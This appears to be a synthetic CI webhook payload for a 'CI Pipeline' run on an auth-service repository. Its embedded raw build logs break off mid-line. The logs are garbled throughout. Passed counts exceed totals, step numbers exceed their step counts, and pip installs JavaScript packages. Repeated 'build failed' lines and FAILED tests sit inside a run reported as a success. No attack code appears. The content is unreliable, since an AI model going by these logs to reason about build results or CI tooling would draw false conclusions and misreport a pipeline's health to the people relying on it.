{
  "action": "completed",
  "workflow_run": {
    "id": 150,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-964",
    "head_sha": "d719931089bb095a61307e02164e007ea26a46e9",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-20T12:46:09.709775Z",
    "updated_at": "2025-12-20T12:49:58.481502Z"
  },
  "repository": {
    "full_name": "startup-io/auth-service",
    "name": "auth-service"
  },
  "sender": {
    "login": "diana"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: type_check ===\nUsing Python 3.11\nRan 53 tests in 30s\nCreating production build...\nCache invalidated: dependencies\n[12:46:09] INFO: Starting build process\nTime: 79.131s\nArtifact downloaded: 1MB\nnpm notice: created a lockfile\nRan 81 tests in 46s\n[12:46:09] INFO: Request completed\nCompiling components/index.js...\nCache miss for key-9878\nGenerating source maps...\nGenerating source maps...\nBundling main.js\n[12:46:09] WARN: Deprecated API usage\nCache saved successfully\nPushing to registry...\nChecking out develop branch\n  PASS: test_auth_login (232ms)\nTLS handshake completed\n\u2713 All checks passed\nCache saved successfully\npip: Collecting express\nLoading...\nTLS handshake completed\nnpm install: resolved 354 packages\nTests: 55 passed, 258 total\nStep 19/25: Installing dependencies\n\u2717 build failed with exit code 40\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPushing to registry...\nRan 168 tests in 4s\n[12:46:09] DEBUG: Query executed in 6ms\nInstalling express@1.4.2\nTest Suites: 33 passed, 38 total\nWARNING: webpack has known vulnerabilities\nChecking out master branch\nOptimizing 51 modules...\nGenerating source maps...\nCompiling src/handler.rs...\nSuccess!\nStep 13/18: Testing\nUploading artifact 'dist' (22 files)\nCache saved successfully\nCache miss for key-5679\nSuccess!\nStep 11/23: Deploying\n[12:46:09] INFO: Request completed\nInstalling webpack@1.19.10\nStep 19/17: Testing\n[12:46:09] INFO: Cache refreshed\n  PASS: e2e/test_auth_login.spec.js\nArtifact downloaded: 49MB\nCreating production build...\nTest Suites: 37 passed, 33 total\n[12:46:09] DEBUG: Loading configuration\n[12:46:09] INFO: Processing request\nInstalling jest@4.13.5\n  PASS: unit/test_user_create.spec.js\nPOST /api - 202 (91ms)\n[12:46:09] WARN: Deprecated API usage\nStep 11/21: Running migrations\nBundling styles.css\n\u2713 All checks passed\nWARNING: jest has known vulnerabilities\nnpm install: resolved 1165 packages\nTLS handshake completed\n[12:46:09] DEBUG: Initializing service\nCache hit for key-6145\nCache restored successfully (359MB)\nCompiling components/index.js...\nnpm install: added 343 packages\nVerifying...\nCompiling src/app.ts...\nFinished.\nStep 3/20: Building\nFetching submodules...\nBundling main.css\nChecking out main branch\n[12:46:09] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nyarn add: Done in 28.30s\npip install: Successfully installed jest-4.6\nUsing Python 3.11\nPOST /upload - 200 (92ms)\nSuccess!\n[12:46:09] WARN: Deprecated API usage\npip: Collecting jest\n  PASS: test_auth_login (494ms)\nFetching from https://googleapis.com/package.json\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSnapshots: 43 passed, 41 total\nCache restored successfully (123MB)\npip: Downloading axios-5.11.tar.gz\npip: Installing build dependencies...\npip: Collecting jest\nRan 26 tests in 8s\nCompiling components/main.py...\nBundling vendor.css\nPlatform: darwin-arm64\nGET /api - 200 (18ms)\n[12:46:09] WARN: Deprecated API usage\nStep 2/21: Installing dependencies\nArtifact uploaded: build.tar.gz (9MB)\nBundling vendor.js\n[12:46:09] INFO: Request completed\nUsing Python 3.10\nCreating production build...\nTransforming 216 files...\n[12:46:09] DEBUG: Query executed in 62ms\nStep 17/23: Linting\nCache invalidated: node_modules\n\u2713 Task completed in 1377ms\n[12:46:09] INFO: Request completed\nLoading...\nCache invalidated: node_modules\nStep 3/22: Building\nBundling runtime.js\nCompiling utils/app.ts...\npip install: Successfully installed axios-2.2\nStep 4/25: Linting\n[12:46:09] DEBUG: Query executed in 64ms\npip install: Successfully installed react-5.0\nOK\nStep 6/22: Running migrations\nStep 12/22: Installing dependencies\npip: Collecting react\nReady.\nPOST /upload - 202 (81ms)\nAlready up to date.\nFinished.\n\u2713 Task completed in 3596ms\nUsing Python 3.10\nOK\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip install: Successfully installed eslint-4.10\n[12:46:09] DEBUG: Connection pool: 19 active\nTime: 96.141s\nBuilding Docker image...\nnpm notice: created a lockfile\nCache miss for key-2018\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling webpack@1.8.7\nnpm install: resolved 410 packages\n  PASS: e2e/test_api_health.spec.js\nMinifying vendor.js\nArtifact uploaded: build.tar.gz (8MB)\nCreating production build...\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompleted.\nProcessing...\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 Task completed in 892ms\nAlready up to date.\nCompleted.\nBuilding Docker image...\nArtifact downloaded: 45MB\n[12:46:09] DEBUG: Query executed in 68ms\n=== Step type_check completed ===\n=== Step: checkout ===\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: react has known vulnerabilities\nBuilding Docker image...\nSuccess!\n  PASS: test_user_create (146ms)\nWARNING: react has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nBundling vendor.js\nPOST /api - 202 (401ms)\nWARNING: axios has known vulnerabilities\nFetching from https://docker.io/package.json\nArtifact downloaded: 5MB\nStep 19/21: Installing dependencies\nCache invalidated: build\nBuilding Docker image...\n\u2713 All checks passed\nCoverage: 75% statements, 73% branches\nWARNING: lodash has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm notice: package.json updated\nInstalling react@1.7.5\nCreating production build...\nCache restored successfully (360MB)\n[12:46:09] DEBUG: Memory usage: 1207MB\n[12:46:09] INFO: Request completed\nNODE_ENV=production\nOptimizing 55 modules...\nGenerating source maps...\n[12:46:09] INFO: Starting build process\n[12:46:09] WARN: Deprecated API usage\nSwitched to branch 'feature/task-225'\n\u2713 Task completed in 1889ms\nnpm install: resolved 1898 packages\nPulling image: node:3.11\nFinished.\nCache saved successfully\n[12:46:09] DEBUG: Initializing service\nFetching from https://googleapis.com/package.json\n\u2713 Step 'build' succeeded\n[12:46:09] INFO: Starting build process\nAlready up to date.\nnpm notice: created a lockfile\nnpm install: added 488 packages\n[12:46:09] INFO: Connecting to database\nTLS handshake completed\nFetching submodules...\nCompiling lib/utils.go...\nCache saved successfully\nLayer 7/9: ENV command\nCache invalidated: node_modules\nCompiling components/service.java...\n[12:46:09] WARN: Deprecated API usage\nStep 20/17: Running migrations\nnpm notice: created a lockfile\nSuccess!\nPulling image: alpine:18\nStep 11/23: Deploying\n[12:46:09] INFO: Processing request\nException: ValueError\n[12:46:09] INFO: Connecting to database\nUsing Python 3.10\nWARNING: react has known vulnerabilities\n\u2713 Task completed in 931ms\nnpm notice: package.json updated\nTests: 150 passed, 252 total\nBuilding Docker image...\nConnection established\n[12:46:09] DEBUG: Memory usage: 619MB\nWaiting...\nPushing to registry...\n[12:46:09] DEBUG: Query executed in 22ms\nnpm install: added 159 packages\nConnection established\nWARNING: jest has known vulnerabilities\n[12:46:09] INFO: Processing request\nConnection established\nUsing Python 3.12\nTime: 113.457s\nMinifying main.js\nCache invalidated: build\n[12:46:09] INFO: Cache refreshed\nAlready up to date.\nChecking out develop branch\nChecking out develop branch\nCache saved successfully\nPushing to registry...\nSuccess!\nWaiting...\n[12:46:09] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSuccess!\nGET /health - 204 (79ms)\nConnection established\n[12:46:09] INFO: Starting build process\nTest Suites: 50 passed, 12 total\nStep 12/16: Building\nTransforming 271 files...\nnpm notice: package.json updated\nWaiting...\nConnection established\nHEAD is now at 80451df\nEnvironment: production\n  PASS: e2e/test_db_connect.spec.js\n[12:46:09] DEBUG: Connection pool: 16 active\nStep 3/23: Building\nTests: 203 passed, 343 total\npip: Installing build dependencies...\nCache miss for key-2448\nWaiting...\nReady.\n[12:46:09] INFO: Request completed\nCache hit for key-1009\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nMinifying main.js\n[12:46:09] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nVerifying...\npip: Collecting react\n\u2713 All checks passed\n[12:46:09] DEBUG: Query executed in 30ms\n[12:46:09] WARN: Deprecated API usage\nImage pulled successfully\n[12:46:09] INFO: Request completed\nCompiling src/service.java...\nStep 19/25: Linting\nOK\nnpm install: added 446 packages\nChecking out develop branch\nCache saved successfully\nInstalling lodash@5.19.0\npip install: Successfully installed react-2.5\nInstalling eslint@5.16.1\nStep 19/20: Installing dependencies\nAlready up to date.\n[12:46:09] DEBUG: Connection pool: 13 active\n[12:46:09] WARN: Deprecated API usage\nLayer 8/15: COPY command\nStep 10/19: Testing\npip: Installing build dependencies...\nTransforming 613 files...\nWARNING: react has known vulnerabilities\n[12:46:09] INFO: Cache refreshed\nUsing Node.js 18.8.3\nLayer 8/10: COPY command\n  PASS: test_api_health (344ms)\nUploading artifact 'dist' (6 files)\nVerifying...\nException: NullPointerException\nStep 10/15: Deploying\nPulling image: node:18\nCoverage: 71% statements, 85% branches\nStep 12/25: Testing\nImage pulled successfully\nCompiling src/utils.go...\nStep 2/23: Running migrations\n[12:46:09] DEBUG: Initializing service\nArtifact uploaded: dist.zip (95MB)\nFetching from https://registry.npmjs.org/package.json\nDone.\n[12:46:09] DEBUG: Memory usage: 267MB\n=== Step checkout completed ===\n=== Step: setup_environment ===\nGET /status - 204 (31ms)\n[12:46:09] INFO: Cache refreshed\nSnapshots: 26 passed, 5 total\nStep 11/22: Building\nDone.\nCache hit for key-3602\nStep 19/19: Running migrations\n  PASS: test_db_connect (271ms)\n\u2713 Task completed in 4152ms\nBuilding Docker image...\nImage pulled successfully\nyarn add: Done in 10.44s\nnpm notice: package.json updated\n\u2713 Step 'setup' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTest Suites: 28 passed, 18 total\nPulling image: node:3.11\nCompiling components/handler.rs...\nTransforming 236 files...\nArtifact downloaded: 26MB\nTransforming 490 files...\nTLS handshake completed\n[12:46:09] WARN: Deprecated API usage\n\u2713 deploy completed\nFetching submodules...\nTests: 115 passed, 256 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTLS handshake completed\nArtifact uploaded: dist.zip (33MB)\nCoverage: 94% statements, 97% branches\npip: Downloading lodash-3.17.tar.gz\nEnvironment: production\n[12:46:09] INFO: Processing request\nnpm notice: created a lockfile\n[12:46:09] DEBUG: Connection pool: 1 active\n[12:46:09] INFO: Processing request\nArtifact uploaded: dist.zip (96MB)\nHEAD is now at a3c243d\nSwitched to branch 'feature/task-948'\nPOST /data - 201 (441ms)\nInstalling eslint@2.3.9\nCompleted.\nStep 10/23: Building\npip: Downloading prettier-4.16.tar.gz\nCache restored successfully (131MB)\npip: Downloading express-2.17.tar.gz\n[12:46:09] WARN: Deprecated API usage\n[12:46:09] DEBUG: Loading configuration\nArtifact uploaded: build.tar.gz (16MB)\nDone.\nTransforming 854 files...\n[12:46:09] DEBUG: Loading configuration\nSwitched to branch 'feature/task-934'\n[12:46:09] INFO: Starting build process\n[12:46:09] INFO: Request completed\nPOST /data - 200 (68ms)\nFetching from https://npmjs.org/package.json\nArtifact uploaded: build.tar.gz (13MB)\nImage pulled successfully\nTests: 118 passed, 241 total\nMinifying main.js\nStep 2/15: Linting\nCompiling lib/index.js...\n\u2713 All checks passed\nCompiling utils/handler.rs...\nArtifact uploaded: dist.zip (96MB)\nFetching submodules...\n\u2713 All checks passed\npip install: Successfully installed express-5.16\nCache invalidated: dependencies\n[12:46:09] WARN: Deprecated API usage\nPulling image: node:3.11\nPushing to registry...\n[12:46:09] WARN: Deprecated API usage\npip: Collecting webpack\nHEAD is now at 2088780\nCompiling src/index.js...\nFinished.\nBundling runtime.js\nTime: 16.64s\nBundling runtime.css\nWARNING: jest has known vulnerabilities\n\u2713 All checks passed\nSwitched to branch 'bugfix/task-356'\nTests: 266 passed, 76 total\nStep 17/22: Running migrations\nnpm notice: created a lockfile\nnpm install: added 118 packages\nFAILED: test_user_create\nBuilding Docker image...\n[12:46:09] DEBUG: Initializing service\nPOST /data - 202 (250ms)\n[12:46:09] INFO: Processing request\nException: ValueError\nConnection established\nArtifact downloaded: 26MB\n\u2713 validate completed\nTLS handshake completed\nPushing to registry...\n[12:46:09] DEBUG: Loading configuration\nEnvironment: development\n[12:46:09] DEBUG: Loading configuration\nPOST /upload - 200 (335ms)\nVerifying...\npip: Installing build dependencies...\nnpm notice: package.json updated\nSnapshots: 23 passed, 44 total\nWaiting...\nStep 19/19: Building\npip install: Successfully installed react-2.8\nFetching submodules...\nPulling image: alpine:18\nUploading artifact 'dist' (43 files)\nUsing Python 3.10\nPushing to registry...\n\u2713 deploy completed\n\u2713 build completed\nCache saved successfully\nEnvironment: development\nnpm notice: package.json updated\nChecking out develop branch\nStep 5/24: Running migrations\nUsing Python 3.12\nChecking out develop branch\nCache invalidated: dependencies\n[12:46:09] INFO: Starting build process\nSuccess!\npip install: Successfully installed axios-3.9\nDone.\nHEAD is now at 523167b\nChecking out develop branch\n[12:46:09] DEBUG: Memory usage: 226MB\nEnvironment: production\nSwitched to branch 'feature/task-464'\n[12:46:09] INFO: Cache refreshed\nSnapshots: 47 passed, 46 total\nPushing to registry...\nSuccess!\nTransforming 993 files...\npip: Downloading jest-3.8.tar.gz\nSwitched to branch 'hotfix/task-789'\nArtifact uploaded: build.tar.gz (48MB)\nnpm notice: created a lockfile\nVerifying...\n\u2713 validate completed\nUsing Node.js 18.5.8\n[12:46:09] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 All checks passed\n[12:46:09] DEBUG: Loading configuration\nSuccess!\nCache invalidated: dependencies\nProcessing...\nVerifying...\nCoverage: 92% statements, 98% branches\npip: Installing build dependencies...\nLoading...\nOptimizing 53 modules...\nCoverage: 100% statements, 81% branches\n=== Step setup_environment completed ===\n=== Step: save_cache ===\nUsing Node.js 19.0.0\nPOST /data - 202 (229ms)\nnpm install: resolved 283 packages\nUsing Python 3.10\nCreating production build...\nWARNING: eslint has known vulnerabilities\nTest Suites: 13 passed, 11 total\nnpm install: added 104 packages\nTLS handshake completed\nFetching submodules...\n[12:46:09] DEBUG: Connection pool: 4 active\nTime: 17.454s\nBundling runtime.js\n[12:46:09] DEBUG: Loading configuration\nLoading...\nAlready up to date.\npip: Installing build dependencies...\nReady.\nCompiling utils/handler.rs...\nLayer 2/10: ENV command\nDone.\n\u2713 Step 'setup' succeeded\nConnection established\nArtifact uploaded: build.tar.gz (35MB)\nImage pulled successfully\nyarn add: Done in 28.40s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/utils.go...\nnpm install: added 441 packages\nDone.\n\u2717 build failed with exit code 12\nNODE_ENV=production\nPlatform: darwin-arm64\nTime: 23.539s\nCreating production build...\nPushing to registry...\nnpm install: resolved 1390 packages\nDone.\nCache restored successfully (119MB)\nCache invalidated: node_modules\nCompleted.\n[12:46:09] INFO: Connecting to database\nNODE_ENV=development\nTests: 98 passed, 399 total\nConnection established\nWARNING: webpack has known vulnerabilities\nPlatform: linux-x64\nnpm install: added 297 packages\n[12:46:09] WARN: Deprecated API usage\n\u2717 build failed with exit code 6\nGenerating source maps...\nSwitched to branch 'bugfix/task-631'\nProcessing...\nCreating production build...\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nDone.\nArtifact uploaded: dist.zip (32MB)\n\u2713 Task completed in 1146ms\nPulling image: alpine:latest\n[12:46:09] ERROR: Connection failed\nArtifact uploaded: dist.zip (95MB)\nSwitched to branch 'hotfix/task-184'\nMinifying app.js\n[12:46:09] ERROR: Connection failed\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSnapshots: 10 passed, 15 total\nArtifact downloaded: 8MB\nOptimizing 43 modules...\nWaiting...\nCompiling src/main.py...\nFetching from https://gcr.io/package.json\nBundling vendor.css\nTLS handshake completed\n[12:46:09] INFO: Starting build process\nTests: 452 passed, 354 total\nnpm install: resolved 1328 packages\nCoverage: 83% statements, 63% branches\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWaiting...\nStep 2/21: Running migrations\nNODE_ENV=development\n\u2713 Step 'test' succeeded\n[12:46:09] DEBUG: Loading configuration\nConnection established\nImage pulled successfully\nWaiting...\npip: Collecting lodash\n\u2713 Step 'checkout' succeeded\nProcessing...\nCompiling lib/app.ts...\nStep 12/21: Installing dependencies\nDone.\nBundling main.js\nProcessing...\nAlready up to date.\nPulling image: node:18\nCompleted.\n  PASS: test_auth_login (157ms)\nLayer 4/11: COPY command\nBundling vendor.css\nCompleted.\nTransforming 495 files...\nAlready up to date.\n\u2713 All checks passed\nBuilding Docker image...\nTime: 58.98s\npip: Installing build dependencies...\npip: Installing build dependencies...\nArtifact uploaded: build.tar.gz (16MB)\nProcessing...\n[12:46:09] INFO: Processing request\nArtifact uploaded: build.tar.gz (24MB)\nPlatform: darwin-arm64\nWaiting...\nnpm install: added 457 packages\nStep 13/23: Running migrations\nCreating production build...\nCoverage: 83% statements, 76% branches\n\u2713 All checks passed\n\u2717 build failed with exit code 98\nTests: 221 passed, 482 total\nUsing Python 3.10\nUsing Python 3.10\nCache hit for key-8320\nnpm notice: created a lockfile\nFetching submodules...\nEnvironment: staging\nCompiling utils/utils.go...\nWARNING: lodash has known vulnerabilities\nTime: 71.455s\nCache miss for key-5241\nSuccess!\nAlready up to date.\nAlready up to date.\nArtifact uploaded: dist.zip (82MB)\nAlready up to date.\nSwitched to branch 'feature/task-583'\nRan 128 tests in 19s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWaiting...\nFetching submodules...\n\u2713 Task completed in 1774ms\nLoading...\nCache hit for key-2939\nWARNING: lodash has known vulnerabilities\n[12:46:09] DEBUG: Connection pool: 6 active\nBundling styles.js\npip install: Successfully installed eslint-5.11\nSuccess!\nPOST /data - 201 (226ms)\nCache saved successfully\n[12:46:09] DEBUG: Memory usage: 862MB\nNODE_ENV=development\nSwitched to branch 'bugfix/task-311'\npip: Downloading jest-4.1.tar.gz\n\u2713 Step 'test' succeeded\n[12:46:09] INFO: Starting build process\nVerifying...\nFetching submodules...\n=== Step save_cache completed ===\n=== Step: build ===\nGenerating source maps...\nNODE_ENV=test\nSnapshots: 31 passed, 13 total\nUsing Python 3.10\nPulling image: python:18\npip install: Successfully installed prettier-4.17\n\u2713 validate completed\nCompleted.\nUsing Node.js 16.9.0\npip: Downloading eslint-1.3.tar.gz\nCache restored successfully (14MB)\n[12:46:09] INFO: Request completed\nChecking out develop branch\nPushing to registry...\nStep 10/15: Linting\nCache saved successfully\nFetching submodules...\n\u2713 All checks passed\nGenerating source maps...\nStep 17/15: Installing dependencies\nSwitched to branch 'bugfix/task-677'\n[12:46:09] DEBUG: Memory usage: 712MB\nCache restored successfully (138MB)\nnpm install: added 13 packages\nCreating production build...\nCompiling src/handler.rs...\n[12:46:09] INFO: Cache refreshed\n\u2713 Task completed in 2441ms\nCache miss for key-1108\nWARNING: react has known vulnerabilities\nTime: 56.638s\nnpm notice: package.json updated\nCompiling utils/handler.rs...\n\u2717 build failed with exit code 93\n[12:46:09] INFO: Processing request\nnpm notice: created a lockfile\npip: Downloading eslint-1.0.tar.gz\nStep 3/17: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:09] ERROR: Connection failed\nLoading...\n  PASS: test_db_connect (136ms)\nPushing to registry...\n  PASS: test_user_create (205ms)\nSnapshots: 22 passed, 9 total\nnpm notice: package.json updated\nCompiling components/index.js...\n[12:46:09] INFO: Starting build process\nCache hit for key-4209\nTransforming 685 files...\nCompleted.\nStep 7/20: Running migrations\nUploading artifact 'build' (28 files)\nRan 85 tests in 21s\nRan 78 tests in 30s\nOptimizing 28 modules...\nCache miss for key-2203\nWARNING: express has known vulnerabilities\nPushing to registry...\n\u2713 Step 'checkout' succeeded\nyarn add: Done in 25.36s\nStep 18/20: Deploying\nStep 15/17: Linting\n\u2713 All checks passed\nPushing to registry...\nReady.\nPOST /data - 200 (438ms)\nInstalling jest@3.0.8\nWaiting...\nCompleted.\nException: RuntimeError\nCompiling utils/index.js...\nWaiting...\nPushing to registry...\nWARNING: axios has known vulnerabilities\nCoverage: 97% statements, 85% branches\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFetching submodules...\n  PASS: test_api_health (231ms)\nSwitched to branch 'feature/task-357'\nGenerating source maps...\n[12:46:09] INFO: Starting build process\n[12:46:09] DEBUG: Initializing service\nPulling image: python:18\nWARNING: express has known vulnerabilities\nCache saved successfully\nOptimizing 76 modules...\nProcessing...\n[12:46:09] INFO: Connecting to database\nTime: 103.253s\nVerifying...\nCompleted.\nnpm notice: package.json updated\nStep 20/22: Testing\nPushing to registry...\nStep 3/16: Running migrations\nGET /status - 204 (79ms)\nEnvironment: production\nSwitched to branch 'bugfix/task-681'\nImage pulled successfully\n[12:46:09] WARN: Deprecated API usage\nAlready up to date.\n[12:46:09] INFO: Starting build process\nStep 8/15: Building\n\u2713 All checks passed\nLoading...\nBundling styles.css\nCache hit for key-2057\nCompiling utils/handler.rs...\n\u2713 Task completed in 3698ms\nPOST /api - 202 (202ms)\nnpm notice: created a lockfile\nLayer 10/10: ENV command\nTLS handshake completed\nCache restored successfully (365MB)\nStep 17/24: Running migrations\nnpm notice: created a lockfile\nPulling image: python:18\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:09] INFO: Cache refreshed\nCompiling lib/index.js...\nArtifact uploaded: dist.zip (89MB)\nCompleted.\nTime: 68.697s\nDone.\n\u2713 lint completed\n\u2713 deploy completed\nBuilding Docker image...\nDone.\nyarn add: Done in 2.28s\nLoading...\nUsing Python 3.11\n[12:46:09] DEBUG: Connection pool: 19 active\nVerifying...\nTime: 11.530s\nCoverage: 92% statements, 99% branches\n  PASS: e2e/test_db_connect.spec.js\n[12:46:09] INFO: Connecting to database\nnpm notice: created a lockfile\nCache restored successfully (370MB)\nImage pulled successfully\nStep 3/19: Running migrations\nStep 15/17: Deploying\npip: Collecting webpack\nFAILED: test_db_connect\nCache hit for key-8400\nnpm install: added 129 packages\nStep 14/18: Running migrations\n\u2717 build failed with exit code 127\nUploading artifact 'dist' (37 files)\nLayer 10/10: COPY command\n\u2713 Task completed in 3341ms\n[12:46:09] INFO: Processing request\nGET /api - 200 (85ms)\n[12:46:09] INFO: Cache refreshed\nSnapshots: 19 passed, 19 total\nSnapshots: 6 passed, 40 total\n[12:46:09] INFO: Processing request\n\u2713 build completed\n[12:46:09] DEBUG: Memory usage: 864MB\nTime: 16.325s\n=== Step build completed ===\n=== Step: integration_tests ===\n[12:46:09] DEBUG: Loading configuration\nImage pulled successfully\nTime: 36.530s\nVerifying...\nCompiling lib/app.ts...\n[12:46:09] INFO: Processing request\nCache restored successfully (14MB)\nCache hit for key-9718\n[12:46:09] DEBUG: Initializing service\nBuilding Docker image...\nFetching submodules...\nCache hit for key-6790\nOK\n[12:46:09] DEBUG: Memory usage: 1549MB\nPushing to registry...\nCompiling utils/handler.rs...\nGET /health - 201 (96ms)\n  PASS: unit/test_db_connect.spec.js\nnpm notice: package.json updated\nImage pulled successfully\nUploading artifact 'build' (18 files)\nReady.\nRan 161 tests in 53s\nnpm install: resolved 1802 packages\nArtifact uploaded: dist.zip (60MB)\n\u2713 Step 'install' succeeded\nCompiling components/service.java...\nException: ValueError\n\u2717 build failed with exit code 72\nTest Suites: 36 passed, 16 total\n[12:46:09] DEBUG: Connection pool: 6 active\nTest Suites: 22 passed, 32 total\npip: Collecting webpack\nSuccess!\nAlready up to date.\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:09] INFO: Cache refreshed\nHEAD is now at bf9eb2f\nChecking out develop branch\n  PASS: unit/test_db_connect.spec.js\nFetching submodules...\nTest Suites: 25 passed, 33 total\nnpm install: resolved 316 packages\nStep 20/25: Testing\n\u2713 build completed\n[12:46:09] INFO: Request completed\n[12:46:09] DEBUG: Connection pool: 20 active\nImage pulled successfully\nCache invalidated: node_modules\n[12:46:09] DEBUG: Connection pool: 13 active\nBundling vendor.js\n[12:46:09] INFO: Request completed\nPlatform: darwin-arm64\nTests: 467 passed, 266 total\n[12:46:09] WARN: Deprecated API usage\nnpm notice: package.json updated\n\u2713 Task completed in 3037ms\nCompleted.\nCoverage: 77% statements, 68% branches\n\u2713 All checks passed\n[12:46:09] INFO: Starting build process\n[12:46:09] ERROR: Connection failed\nStep 14/25: Building\n[12:46:09] WARN: Deprecated API usage\nDone.\nProcessing...\nProcessing...\nTests: 141 passed, 271 total\n  PASS: test_db_connect (241ms)\nStep 14/20: Installing dependencies\nTransforming 861 files...\nAlready up to date.\n[12:46:09] INFO: Processing request\nUsing Node.js 14.0.10\n\u2713 Task completed in 3309ms\nnpm install: resolved 1958 packages\n[12:46:09] INFO: Cache refreshed\nCache invalidated: build\nStep 17/25: Deploying\nArtifact downloaded: 16MB\nFAILED: test_auth_login\nFetching from https://docker.io/package.json\nCache restored successfully (166MB)\n[12:46:09] DEBUG: Initializing service\nWARNING: webpack has known vulnerabilities\n\u2713 All checks passed\nRan 130 tests in 28s\nRan 40 tests in 54s\nException: TypeError\n\u2713 Step 'checkout' succeeded\nArtifact uploaded: dist.zip (16MB)\nNODE_ENV=test\nCache hit for key-7387\nyarn add: Done in 14.69s\nOptimizing 12 modules...\nReady.\n[12:46:09] DEBUG: Loading configuration\nCompiling lib/service.java...\nConnection established\nWaiting...\n\u2713 validate completed\nArtifact uploaded: build.tar.gz (27MB)\n\u2713 Step 'test' succeeded\nException: NullPointerException\npip: Installing build dependencies...\nOK\nConnection established\n[12:46:09] INFO: Starting build process\n[12:46:09] WARN: Deprecated API usage\nAlready up to date.\n[12:46:09] INFO: Processing request\npip: Downloading express-1.9.tar.gz\nCache invalidated: node_modules\nWARNING: webpack has known vulnerabilities\nUploading artifact 'coverage' (44 files)\nSnapshots: 29 passed, 28 total\nTLS handshake completed\nSuccess!\nCompiling lib/app.ts...\nSnapshots: 46 passed, 22 total\nWaiting...\nGenerating source maps...\nWaiting...\nCache invalidated: node_modules\nStep 8/18: Linting\npip: Installing build dependencies...\nTLS handshake completed\nSwitched to branch 'bugfix/task-343'\n  PASS: integration/test_api_health.spec.js\nSnapshots: 49 passed, 32 total\nnpm install: added 275 packages\nWARNING: express has known vulnerabilities\nnpm notice: created a lockfile\n[12:46:09] INFO: Starting build process\n  PASS: test_api_health (106ms)\nBuilding Docker image...\nPlatform: darwin-arm64\nEnvironment: test\nCoverage: 89% statements, 98% branches\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/service.java...\n[12:46:09] INFO: Cache refreshed\n[12:46:09] DEBUG: Memory usage: 448MB\nWARNING: eslint has known vulnerabilities\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nRan 173 tests in 52s\nTLS handshake completed\nBundling main.js\nCache miss for key-5218\n[12:46:09] DEBUG: Initializing service\nTests: 397 passed, 71 total\nException: NullPointerException\nCompiling lib/app.ts...\nBundling styles.css\nWARNING: prettier has known vulnerabilities\nStep 12/15: Building\nFAILED: test_cache_hit\nCompiling src/main.py...\nTest Suites: 50 passed, 28 total\n=== Step integration_tests completed ===\n=== Step: deploy_staging ===\nGET /status - 201 (17ms)\nCompiling lib/service.java...\nWARNING: webpack has known vulnerabilities\nCache hit for key-1650\n[12:46:09] INFO: Processing request\nStep 13/16: Deploying\nCoverage: 88% statements, 90% branches\nCompiling lib/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 Step 'setup' succeeded\nFetching submodules...\nGET /status - 201 (67ms)\nSwitched to branch 'feature/task-470'\nTest Suites: 22 passed, 15 total\n[12:46:09] DEBUG: Loading configuration\nCache invalidated: build\nNODE_ENV=production\n[12:46:09] INFO: Request completed\n  PASS: test_auth_login (479ms)\nBundling main.css\nTests: 415 passed, 439 total\nLoading...\nWARNING: react has known vulnerabilities\nSnapshots: 26 passed, 46 total\n[12:46:09] DEBUG: Initializing service\n[12:46:09] WARN: Deprecated API usage\nTransforming 768 files...\nChecking out develop branch\nMinifying app.js\nCache invalidated: build\nVerifying...\nUsing Python 3.9\nyarn add: Done in 9.58s\nPushing to registry...\nCache saved successfully\n\u2717 build failed with exit code 43\nCreating production build...\n  PASS: unit/test_user_create.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSnapshots: 35 passed, 10 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:09] WARN: Deprecated API usage\nCompiling components/handler.rs...\nUsing Node.js 18.16.7\n[12:46:09] DEBUG: Initializing service\nnpm install: resolved 1948 packages\nStep 13/16: Running migrations\n[12:46:09] DEBUG: Connection pool: 20 active\nEnvironment: staging\nHEAD is now at c863490\nTests: 233 passed, 107 total\nCache saved successfully\nRan 167 tests in 44s\nFinished.\n[12:46:09] INFO: Request completed\nCompiling src/handler.rs...\nCache restored successfully (342MB)\n[12:46:09] DEBUG: Initializing service\nOptimizing 89 modules...\nStep 12/16: Installing dependencies\nUploading artifact 'coverage' (3 files)\nCache restored successfully (19MB)\nSuccess!\nFinished.\nArtifact uploaded: dist.zip (7MB)\nPOST /data - 202 (335ms)\nChecking out develop branch\n[12:46:09] INFO: Cache refreshed\n\u2717 build failed with exit code 106\n[12:46:09] INFO: Starting build process\nTests: 167 passed, 73 total\nTests: 167 